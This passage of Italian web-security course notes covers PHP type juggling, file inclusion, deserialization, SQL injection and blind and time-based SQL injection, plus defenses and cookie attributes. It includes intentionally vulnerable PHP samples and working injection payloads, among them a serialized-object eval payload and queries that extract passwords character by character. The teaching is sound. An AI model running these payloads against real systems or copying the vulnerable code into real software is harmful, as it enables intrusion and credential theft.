+<p>Se avessimo un token del tipo <code>“0e394…”</code> in questo caso tale stringa potrebbe essere convertita in un intero scritto in notazione esponenziale (<span class="katex--inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo>⋅</mo><mn>1</mn><msup><mn>0</mn><mrow><mn>394</mn><mo>…</mo></mrow></msup><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">0\cdot 10^{394…} = 0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height: 0.64444em; vertical-align: 0em;"></span><span class="mord">0</span><span class="mspace" style="margin-right: 0.222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right: 0.222222em;"></span></span><span class="base"><span class="strut" style="height: 0.814108em; vertical-align: 0em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height: 0.814108em;"><span class="" style="top: -3.063em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">394</span><span class="minner mtight">…</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.277778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.277778em;"></span></span><span class="base"><span class="strut" style="height: 0.64444em; vertical-align: 0em;"></span><span class="mord">0</span></span></span></span></span>), per cui se l’attaccante fornisce l’input <code>“0”</code> supererebbe il confronto debole, venendo quindi autenticato.</p>
+<p>Si potrebbe pensare che usare strcmp renda il codice più sicuro, in quanto viene delegato il controllo ad una funzione nativa, ma il problema comunque rimane se facciamo il confronto in questo modo:</p>
+<p><code>if (strcmp($input, $token) == 0) {</code></p>
+<p>se <code>strcmp</code> fallisce ritorna <code>NULL</code>, ma <code>NULL</code> viene convertito in <code>0</code> e quindi si supera il controllo.</p>
+</li>
+</ul>
+<h2 id="file-inclusion-attacks">2 File inclusion attacks</h2>
+<p>Prendiamo d’esempio un codice in cui vengono caricate delle pagine in modo dinamico in base ad un parametro passato in GET dall’utente:</p>
+<pre class=" language-php"><code class="prism  language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"p"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+		 <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"p"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token punctuation">}</span>
+	<span class="token keyword">else</span> <span class="token punctuation">{</span>
+		 <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">"home.html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token punctuation">}</span>
+<span class="token delimiter important">?&gt;</span></span>
+</code></pre>
+<p>Con il metodo GET i parametri sono in chiaro sull’URL, quindi l’utente può scrivere quello che vuole, ad esempio mettere il percorso di file all’interno del server.</p>
+<h2 id="deserialization-attacks">3 Deserialization attacks</h2>
+<p>Negli URL è possibile usare un sottoinsieme dei caratteri ASCII, alcuni caratteri sono riservati per essere utilizzati come delimitatori (es. <code>/</code> <code>?</code> <code>:</code> <code>+</code> <code>=</code>). Tali caratteri possono essere messi nell’URL ma verranno sostituiti da un carattere <code>%</code> seguito da due caratteri esadecimali.</p>
+<pre><code>How are you?
+How%20are%20you%3F
+</code></pre>
+<p>anche i cookie seguono questa codifica (che avviene in automatico su PHP)</p>
+<p>L’attacco di deserializzazione, sfrutta il <strong>meccanismo di serializzazione e deserializzazione degli oggetti</strong>. La serializzazione converte un oggetto in una stringa di testo. La <strong>deserializzazione</strong>, al contrario, ricostruisce l’oggetto a partire dalla stringa.</p>
+<p>Il problema risiede nel fatto che la deserializzazione di una stringa proveniente da una fonte non affidabile può portare all’esecuzione di codice arbitrario.</p>
+<p>Questo è possibile perché la deserializzazione può richiamare automaticamente dei metodi speciali, chiamati “<strong>metodi magici</strong>”, definiti all’interno della classe dell’oggetto.<br>
+Ad esempio il metodo magico <code>__wakeup()</code> viene invocato automaticamente dopo la deserializzazione di un oggetto appartenente a quella classe.</p>
+<p>Un attaccante può creare un oggetto appartenente ad una classe presente sul server, inserire del codice malevolo, serializzarlo, codificarlo come URL e inserirlo in un cookie.</p>
+<p>Quando il server prenderà il cookie, la stringa verrà deserializzata e il codice malevolo all’interno di <code>__wakeup()</code> verrà eseguito.</p>
+<p>Codice del server:</p>
+<pre class=" language-php"><code class="prism  language-php"><span class="token keyword">class</span> <span class="token class-name">Example</span> <span class="token punctuation">{</span>
+	 <span class="token keyword">private</span> <span class="token variable">$hook</span><span class="token punctuation">;</span>
+	 <span class="token comment">// some PHP code...</span>
+	 <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+		 <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">hook</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token function">eval</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">hook</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	 <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+
+<span class="token comment">// simulating the attack</span>
+<span class="token variable">$user_data</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token string">'O%3A8%3A%22Example2%22%3A1%3A%7Bs%3A14%3A%22%00Exam ple2%00hook%22%3Bs%3A10%3A%22phpinfo%28%29%3B%22%3B%7D'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</code></pre>
+<p>La stringa codificata è stata prodotta dall’attaccante in questo modo, serializzando una istanza della classe <code>Example</code>:</p>
+<pre class=" language-php"><code class="prism  language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+	<span class="token keyword">class</span> <span class="token class-name">Example</span>
+	<span class="token punctuation">{</span>
+		 <span class="token keyword">private</span> <span class="token variable">$hook</span> <span class="token operator">=</span> <span class="token string">"phpinfo();"</span><span class="token punctuation">;</span>
+	<span class="token punctuation">}</span>
+	
+	<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Example</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?&gt;</span></span>
+</code></pre>
+<h2 id="sql-injection-attacks">4 SQL injection attacks</h2>
+<p>SQL injection è un attacco che prevede di inserire query SQL arbitrarie nei campi di input, con l’obiettivo che tali stringhe vengano messe all’interno di query reali senza una corretta sanitizzazione modificandone quindi il comportamento.</p>
+<p>Vediamo un esempio di query per ottenere le informazione di un utente in base al cognome inserito dall’utente in un form di input.</p>
+<p><code>$query = "SELECT name, lastname FROM people WHERE lastname = '" . $_POST['lastname'] . "'";</code></p>
+<p>Nota che <code>.</code> serve per concatenare stringhe in PHP.</p>
+<p>L’attaccante ha il controllo di una parte della query, cioè <code>$_POST['lastname']</code>.</p>
+<p>L’attaccante può inserire un <code>'</code> per lasciare la stringa vuota a aggiungere un altro confronto che risulterà essere sempre vero per poi commentare la restante parte della query per evitare che la query vada in errore.</p>
+<p>Ad esempio ottenendo una query di questo tipo:</p>
+<p><code>SELECT name, lastname FROM people WHERE lastname = '' OR 1 -- '</code></p>
+<p>In questo modo la condizione nel <code>where</code> sarà sempre vera e l’attaccante ottiene il risultato della query anche se non dovrebbe.</p>
+<h3 id="attacchi-black-box-al-database">Attacchi black box al database</h3>
+<p>L’attaccante potrebbe non sapere i nomi di tabelle e colonne all’interno di un database.</p>
+<p>Può sfruttare il comando <code>UNION ALL</code> per fare il dump di altre tabelle.</p>
+<p>Un attacco black box inizia con la determinazione del numero di colonne tramite una serie di tentativi con query del tipo</p>
+<ul>
+<li><code>... where lastname = '' UNION ALL SELECT 1 #'</code></li>
+<li><code>... where lastname = '' UNION ALL SELECT 1,2 #'</code></li>
+<li><code>... where lastname = '' UNION ALL SELECT 1,1,1 #'</code></li>
+<li>…</li>
+</ul>
+<p>fino a quando la query restituisce un output.</p>
+<p>Successivamente, si ipotizzano i nomi delle tabelle usando nomi comuni come <code>users</code>, <code>customers</code>, <code>people</code>,</p>
+<ul>
+<li><code>... where lastname = '' UNION ALL SELECT 1,1,1 FROM users #'</code></li>
+<li><code>... where lastname = '' UNION ALL SELECT 1,1,1 FROM customers #'</code></li>
+<li><code>... where lastname = '' UNION ALL SELECT 1,1,1 FROM people #'</code></li>
+<li>…</li>
+</ul>
+<p>fino a quando si ottiene una risposta positiva.</p>
+<p>Lo stesso metodo può essere applicato per scoprire i nomi delle colonne.</p>
+<p>Siccome il comando <code>UNION ALL</code> richiede che le due tabelle unite selezionino lo stesso numero di colonne, se la seconda tabella che vogliamo dumpare ha più colonne della prima, la query andrà in errore, ma possiamo usare a concatenazione di colonne in un’unica colonna utilizzando la funzione <code>CONCAT()</code>.</p>
+<p>Un altra cosa che l’attaccante può fare è dumpare le informazioni contenute nel database <code>information_schema</code>, il quale contiene informazioni su tutti gli altri database presenti nel sistema tra cui i nomi dei database, le tabelle e le colonne.</p>
+<h2 id="tecniche-di-difesa">Tecniche di difesa</h2>
+<h3 id="sql-injection">SQL injection</h3>
+<p>Per contrastare gli attacchi SQL injection, si possono usare i <strong>prepared statements</strong>, un meccanismo che prevede la preparazione della query da parte del database prima che i parametri effettivi vengano inseriti. In questo modo, l’input fornito dall’utente non viene interpretato come codice SQL.</p>
+<p>Esempio:</p>
+<p><img src="https://i.ibb.co/TqTykb7/image.png" alt="https://i.ibb.co/TqTykb7/image.png"></p>
+<p>Anche da PHP si possono usare i prepared statemet:</p>
+<pre class=" language-php"><code class="prism  language-php"><span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$link</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token string">"SELECT name, lastname, url FROM people WHERE lastname = ?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">bind_param</span><span class="token punctuation">(</span><span class="token string">"s"</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'lastname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</code></pre>
+<p>Non tutte le parti di una query SQL possono essere parametrizzate con le <em>prepared statements, a</em>d esempio, il nome della tabella. Per questo si utilizzano tecniche come il <strong>type casting</strong>, il <strong>whitelisting</strong> e la <strong>sanitizzazione</strong> dell’input.</p>
+<ul>
+<li>Il <strong>type casting</strong> consiste nella conversione dei parametri numerici in interi, impedendo l’inserimento di payload arbitrari che potrebbero contenere codice dannoso.</li>
+<li>Il <strong>whitelisting</strong> limita l’input dell’utente a un insieme predefinito di valori considerati validi</li>
+<li>La <strong>sanitizzazione</strong> prevede l’escape dei caratteri speciali presenti nell’input dell’utente prima che venga utilizzato nella query, riducendo la possibilità di interpretazioni errate.</li>
+</ul>
+<h3 id="best-practice-generali">Best practice generali</h3>
+<p>Oltre alle tecniche specifiche per prevenire le SQL injection, vediamo delle <em>best practices</em> di sicurezza per lo sviluppo di applicazioni web in PHP.</p>
+<ol>
+<li>
+<p><strong>Utilizzo del confronto stretto (===)</strong>: L’uso dell’operatore di confronto stretto (===), che verifica sia il valore che il tipo senza conversioni automatiche, previene attacchi basati su manipolazioni del confronto di stringhe.</p>
+</li>
+<li>
+<p><strong>Casting dei valori o controllo dei tipi</strong>: prima di utilizzare una variabile in una funzione, è consigliabile eseguire il casting esplicito al tipo di dato atteso o verificare il tipo di dato effettivo.</p>
+</li>
+<li>
+<p><strong>Whitelist rigorosa</strong>: quando possibile, limitare l’input dell’utente a un insieme predefinito di valori validi. Questa tecnica, detta <em>whitelisting</em>, è particolarmente efficace per prevenire attacchi di <em>file inclusion</em>.</p>
+</li>
+<li>
+<p><strong>Verifica dell’integrità dell’input</strong>: prima di utilizzare l’input dell’utente in funzioni potenzialmente pericolose, come la deserializzazione, è fondamentale verificarne l’integrità per individuare eventuali modifiche malevole. Questa verifica può essere effettuata utilizzando tecniche come HMAC (<em>Hash-based Message Authentication Code</em>). HMAC utilizza una chiave segreta per generare un hash per il messaggio.</p>
+<p>Quindi il web server genera una chiave segreta internamente. Quando esporta dati li manda in chiaro affiancati dal rispettivo hash. Quando invece importa dati, prima di utilizzarli (ad esempio fare la deserializzazione) si ricalcola l’hash dei dati e verifica che il risultato combaci con l’hash ricevuto</p>
+</li>
+<li>
+<p><strong>Funzioni e API sicure</strong>: quando disponibili, utilizzare funzioni e API standard. Queste funzioni spesso implementano internamente le <em>best practices</em> di sicurezza.</p>
+</li>
+</ol>
+<h1 id="side-channels">Side channels</h1>
+<p>È comune che i software abbiano dei <strong>side effect</strong>, cioè degli effetti osservabili che riflettono lo stato interno del programma. Se i side effect dipendono da un valore segreto si ha un <strong>leak parziale</strong>, se tale leak è sufficiente per scoprire il segreto allora abbiamo un attacco.</p>
+<p>Un esempio può essere il controllo di una password: ad ogni tentativo l’attaccante scopre che una determinata password è sbagliata. Questo è un leak parziale, infatti l’attaccante può tentare un attacco <strong>brute force</strong>. Per difendersi si può limitare il numero di tentativi.</p>
+<h2 id="side-channels-1">Side channels</h2>
+<p>I <strong>side channels</strong> (o <strong>canali laterali</strong>) nella sicurezza informatica sono metodi per estrarre informazioni sensibili da un sistema, sfruttando i side effect e caratteristiche fisiche anziché attacchi diretti sui dati o sugli algoritmi.</p>
+<h3 id="esempi-di-side-channels">Esempi di side channels:</h3>
+<ul>
+<li><strong>Attacco alla cache (<em>Cache attack</em>)</strong>: un attacco in cui l’attaccante monitora gli accessi alla memoria cache in un sistema che utilizza risorse condivise, come in un ambiente virtualizzato o in certi servizi in cloud</li>
+<li><strong>Attacco a cronometro (<em>Timing attack</em>)</strong>: un attacco che si basa sulla misura dei tempi di esecuzione di certi calcoli, ad esempio il confronto dei tempi di criptazione della password ignota con i tempi di criptazione di password note</li>
+<li><strong>Attacco di monitoraggio dei consumi (<em>Power-monitoring attack</em>)</strong>: attacchi che analizzano il consumo di energia del sistema da violare, per capirne le caratteristiche</li>
+<li><strong>Attacco elettromagnetico (<em>Electromagnetic attack</em>)</strong>: attacchi basati sul rilevamento dell’energia elettromagnetica, che possono rivelare direttamente dati e altre informazioni</li>
+<li><strong>Analisi differenziale dei malfunzionamenti (<em>Differential fault analysis</em>)</strong>: si deducono informazioni sul sistema analizzando malfunzionamenti provocati appositamente</li>
+</ul>
+<p>Ad esempio in un login quando username o password sono errati è raccomandato restituire un generico “credenziali errate” al posto di specificare quale dei due è errato (in quanto potrebbe aiutare un attaccante).</p>
+<p>Un altro esempio è di utilizzare codice <em><strong>time-safe</strong></em>: il controllo di una password è più lento di un controllo di un username (a causa dell’hashing per esempio), questo può essere notato da un attaccante e dedurre quale delle due credenziali è errata. Funzioni time-safe impiegano lo stesso tempo indipendentemente dai dati su cui operano.</p>
+<h2 id="blind-sql-injection">Blind SQL injection</h2>
+<p>La <strong>Blind SQL injection</strong> è una tecnica di attacco che sfrutta i side channel per ottenere informazioni da un database.</p>
+<p>Si utilizza solitamente quando il risultato di una query non viene visualizzato direttamente sulla pagina web, ma l’applicazione fornisce comunque un feedback osservabile che dipende dallo stato interno del database, come un messaggio particolare, un errore, una pagina rotta, o una pagina vuota.</p>
+<p>Possiamo pensare quindi di ottenere una risposta boolena, e iterando questa tecnica si riesce ad leakare dati sensibili.</p>
+<h3 id="funzionamento-generale">Funzionamento generale</h3>
+<ol>
+<li><strong>Iniezione della query</strong>: l’attaccante inietta codice SQL malevolo nell’input di un’applicazione web.</li>
+<li><strong>Osservazione del side channel</strong>: l’attaccante osserva il comportamento dell’applicazione, cercando differenze nel tempo di risposta, nei messaggi di errore, o altri comportamenti che possono rivelare informazioni sul database.</li>
+<li><strong>Deduzione dei dati</strong>: l’attaccante deduce i dati del database in base al feedback ottenuto. Questo processo può essere iterato per ottenere gradualmente le informazioni desiderate.</li>
+</ol>
+<h3 id="esempio-3"><strong>Esempio:</strong></h3>
+<p>Supponiamo un servizio di recupero password che invia un’email con una nuova password agli utenti registrati nel sistema.</p>
+<p>Se l’utente esiste, l’email viene inviata, altrimenti viene visualizzato un messaggio di errore.</p>
+<p>Questo scenario può essere vulnerabile ad una blind SQL injection se l’attaccante può manipolare la query che controlla l’esistenza dell’utente nel database.</p>
+<p>Supponiamo che la query per controllare l’esistenza dell’utente sia del tipo:</p>
+<p><code>SELECT 1 FROM ... WHERE ... email='EMAIL’</code></p>
+<p>dove <code>EMAIL</code> è un input utente.</p>
+<ul>
+<li>
+<p>L’attaccante può modificare il comportamento della query, ad esempio aggiungendo una condizione che è sempre vera (come <code>'OR 1 #</code>).</p>
+</li>
+<li>
+<p>Se l’applicazione invia comunque l’email (e quindi non viene restituito un errore), significa che il database è vulnerabile a SQL injection.</p>
+</li>
+<li>
+<p>A questo punto l’attaccante fa una injection e compone una query di questo tipo con lo scopo di ottenere il nome delle tabelle dal database andando a tentativi:</p>
+<pre class=" language-sql"><code class="prism  language-sql"> <span class="token keyword">SELECT</span> <span class="token number">1</span>
+ <span class="token keyword">FROM</span> people
+ <span class="token keyword">WHERE</span> mail<span class="token operator">=</span><span class="token string">''</span> <span class="token operator">OR</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token number">1</span> <span class="token keyword">FROM</span> users <span class="token keyword">LIMIT</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">LIMIT</span> <span class="token number">1</span><span class="token punctuation">;</span>
+</code></pre>
+<p>In questo modo se non viene dato errore scopriamo che la tabella <code>users</code> esiste, altrimenti possiamo pensare che la tabella non esista.</p>
+</li>
+<li>
+<p>L’attaccante può adesso controllare l’esistenza di una particolare colonna, tramite la funzione SQL <code>MID</code>. Tale funzione prende tre parametri <code>MID(string, start_pos, len)</code> e restituisce una sottostringa di <code>string</code> di lunghezza <code>len</code> partendo dalla posizione <code>start_pos</code> (nota che gli indici in SQL partono da 1, non da 0).</p>
+<p>Verrà composta la seguente query per controllare l’esistenza della colonna <code>password</code>:</p>
+<pre class=" language-sql"><code class="prism  language-sql"><span class="token keyword">SELECT</span> <span class="token number">1</span>
+<span class="token keyword">FROM</span> people
+<span class="token keyword">WHERE</span> mail<span class="token operator">=</span><span class="token string">' '</span> <span class="token operator">OR</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token function">MID</span><span class="token punctuation">(</span>password<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> people <span class="token keyword">LIMIT</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">''</span> <span class="token comment">#</span>
+</code></pre>
+<p>se la colonna <code>password</code> non esiste la query darà errore, altrimenti darà successo in quanto stiamo prendendo una sottostringa di lunghezza zero uguale quindi a <code>''</code>.</p>
+</li>
+<li>
+<p>A questo punto l’attaccante può fare la query carattere per carattere fino a scoprire la password completa.</p>
+<p>Si può fare una ricerca binaria per ridurre il numero di tentativi:</p>
+<p>la funzione <code>ORD</code> restituisce il codice ASCII del caratteri più a sinistra della stringa che prende in input</p>
+<pre class=" language-sql"><code class="prism  language-sql"><span class="token keyword">SELECT</span> <span class="token number">1</span>
+<span class="token keyword">FROM</span> people
+<span class="token keyword">WHERE</span> mail<span class="token operator">=</span><span class="token string">' '</span> <span class="token operator">OR</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span> ORD<span class="token punctuation">(</span><span class="token function">MID</span><span class="token punctuation">(</span>password<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> people <span class="token keyword">LIMIT</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span>ORD<span class="token punctuation">(</span><span class="token string">'m'</span><span class="token punctuation">)</span> <span class="token comment">#</span>
+					 <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token boolean">FALSE</span>
+<span class="token keyword">SELECT</span> <span class="token number">1</span>
+<span class="token keyword">FROM</span> people
+<span class="token keyword">WHERE</span> mail<span class="token operator">=</span><span class="token string">' '</span> <span class="token operator">OR</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span> ORD<span class="token punctuation">(</span><span class="token function">MID</span><span class="token punctuation">(</span>password<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> people <span class="token keyword">LIMIT</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span>ORD<span class="token punctuation">(</span><span class="token string">'t'</span><span class="token punctuation">)</span> <span class="token comment">#</span>
+					 <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token boolean">FALSE</span>
+<span class="token keyword">SELECT</span> <span class="token number">1</span>
+<span class="token keyword">FROM</span> people
+<span class="token keyword">WHERE</span> mail<span class="token operator">=</span><span class="token string">' '</span> <span class="token operator">OR</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span> ORD<span class="token punctuation">(</span><span class="token function">MID</span><span class="token punctuation">(</span>password<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> people <span class="token keyword">LIMIT</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span>ORD<span class="token punctuation">(</span><span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token comment">#</span>
+					 <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token boolean">FALSE</span>
+<span class="token keyword">SELECT</span> <span class="token number">1</span>
+<span class="token keyword">FROM</span> people
+<span class="token keyword">WHERE</span> mail<span class="token operator">=</span><span class="token string">' '</span> <span class="token operator">OR</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span> ORD<span class="token punctuation">(</span><span class="token function">MID</span><span class="token punctuation">(</span>password<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> people <span class="token keyword">LIMIT</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span>ORD<span class="token punctuation">(</span><span class="token string">'y'</span><span class="token punctuation">)</span> <span class="token comment">#</span>
+					 <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token boolean">TRUE</span>
+<span class="token keyword">SELECT</span> <span class="token number">1</span>
+<span class="token keyword">FROM</span> people
+<span class="token keyword">WHERE</span> mail<span class="token operator">=</span><span class="token string">' '</span> <span class="token operator">OR</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span> ORD<span class="token punctuation">(</span><span class="token function">MID</span><span class="token punctuation">(</span>password<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> people <span class="token keyword">LIMIT</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span>ORD<span class="token punctuation">(</span><span class="token string">'x'</span><span class="token punctuation">)</span> <span class="token comment">#</span>
+					 <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token boolean">TRUE</span>
+</code></pre>
+<p><img src="https://i.ibb.co/X2yDcTk/image.png" alt="https://i.ibb.co/X2yDcTk/image.png"></p>
+</li>
+</ul>
+<h2 id="totally-blind-sql-injection">Totally blind SQL injection</h2>
+<p>Anche in caso in cui la web application non mostra errori, messaggi particolari, o altri feedback visibili che possono portare a leak parziali, è comunque possibile per l’attaccante sfruttare il <strong>tempo</strong> per fare SQL injection, pratica chiamata <em>Totally Blind SQL Injection.</em></p>
+<p>Sempre nella situazione precedente l’attaccante può fare una cosa del tipo:</p>
+<pre class=" language-sql"><code class="prism  language-sql"><span class="token keyword">SELECT</span> <span class="token number">1</span>
+<span class="token keyword">FROM</span> people
+<span class="token keyword">WHERE</span> mail<span class="token operator">=</span><span class="token string">''</span> <span class="token operator">OR</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span>
+		<span class="token keyword">IF</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> ORD<span class="token punctuation">(</span><span class="token function">MID</span><span class="token punctuation">(</span>password<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> people <span class="token keyword">LIMIT</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span>ORD<span class="token punctuation">(</span><span class="token string">'m'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> 
+       SLEEP<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+       <span class="token boolean">NULL</span><span class="token punctuation">)</span>
+   <span class="token punctuation">)</span> <span class="token comment">#</span>
+</code></pre>
+<p>la sintassi dell’<code>IF</code> è la seguente <code>IF(*condition*, *value_if_true*, *value_if_false*)</code>.</p>
+<p>Cioè quando la query ha successo viene fatto uno sleep di un secondo che può essere notato dall’attaccante per capire il successo o meno della query.</p>
+<h1 id="attacchi-web-client-side">Attacchi web client side</h1>
+<h2 id="token-di-sessione">Token di sessione</h2>
+<p>Oltre agli attacchi diretti al codice lato server o ai database, esistono attacchi che sfruttano il <strong>browser</strong>, sono quindi <strong>lato client</strong>.</p>
+<p>Le applicazioni web di solito mantengono uno <strong>stato</strong>, ad esempio quando un utente fa un login, inizia una sessione tramite un <strong>token di sessione</strong> che identifica l’utente senza che esso si autentichi su ogni pagina (questo meccanismo è dovuto al fatto che HTTP è un protocollo stateless).</p>
+<p>Il token di sessione può essere memorizzato in diversi modi ma quello standard è nei <strong>Cookie del browser</strong>, in questo modo il token viene automaticamente passato assieme ad ogni richiesta verso il server.</p>
+<p>Se un token di sessione viene indovinato o divulgato, l’utente può essere impersonificato da qualcun altro, pertanto, il token deve essere <strong>imprevedibile</strong> <strong>e segreto</strong>.</p>
+<h3 id="cookie">Cookie</h3>
+<p>Un cookie viene impostato nell’header HTTP <code>Set-cookie</code> presente all’interno di una risposta dal server verso il client, è formato nel seguente modo:</p>
+<pre><code>Set-Cookie: NAME=VALUE; Domain=example.com; Path=/; Expires=Wed, 09 Dec 2024 12:00:00 GMT; Secure; HttpOnly; SameSite=Strict
+</code></pre>
+<ul>
+<li><code>NAME=VALUE</code>: Nome e valore del cookie.</li>
+<li><code>Domain=example.com</code> (opzionale): Specifica il dominio per cui il cookie è valido.</li>
+<li><code>Path=/</code> (opzionale): Specifica il percorso del dominio a cui il cookie si applica.</li>
+<li><code>Expires=Wed, 09 Dec 2024 12:00:00 GMT</code> (opzionale): Indica la data e l’ora in cui il cookie scadrà. Se non è specificato verrà eliminato alla chiusura del browser.</li>
+<li><code>Secure</code> (opzionale): Indica che il cookie deve essere trasmesso solo su connessioni HTTPS.</li>
+<li><code>HttpOnly</code> (opzionale): Indica che il cookie non è accessibile tramite JavaScript (ad esempio, usando <code>document.cookie</code>)</li>
+<li><code>SameSite=Strict|Lax|None</code> (opzionale): indica se il cookie deve essere allegato a richieste provenienti da altri siti:
+<ul>
+<li>
+<p><code>Strict</code>: Il cookie viene inviato <strong>solo</strong> quando il client interagisce direttamente con il dominio specificato nel cookie (digitandolo nella barre dell’URL).</p>
+<p>Se l’utente clicca su un link in un altro sito che reindirizza al dominio specificato, il cookie <strong>non</strong> viene inviato.</p>
+</li>
+<li>
+<p><code>Lax</code>: Il cookie viene inviato anche quando il client clicca su un link in un altro sito che lo reindirizza al dominio specificato.</p>
+<p>Il cookie <strong>non</strong> viene inviato per richieste automatiche originate da un altro sito, come caricamenti di immagini o iframe.</p>
+</li>
+<li>
+<p><code>None</code>: Il cookie viene inviato in <strong>tutte le richieste.</strong> Tuttavia, deve essere accompagnato dal flag <code>Secure</code></p>
+</li>
+</ul>
+</li>
+</ul>
+<p>Il browser allega automaticamente i cookie ad una richiesta web quando:</p>
+<ul>
+<li>il dominio dell’URL finisce come il dominio specificato nel cookie, ad esempio  <code>sub.example.com</code> finisce come <code>example.com</code> che è specificato nel cookie.</li>
+<li>il path dell’URL inizia come il path specificato nel cookie, ad esempio <code>https://example.com/app/dashboard</code> inizia per <code>/app</code> che è specificato nel cookie</li>
+<li>il protocollo è HTTPS se il cookie è contrassegnato come <code>secure</code>.</li>
+</ul>
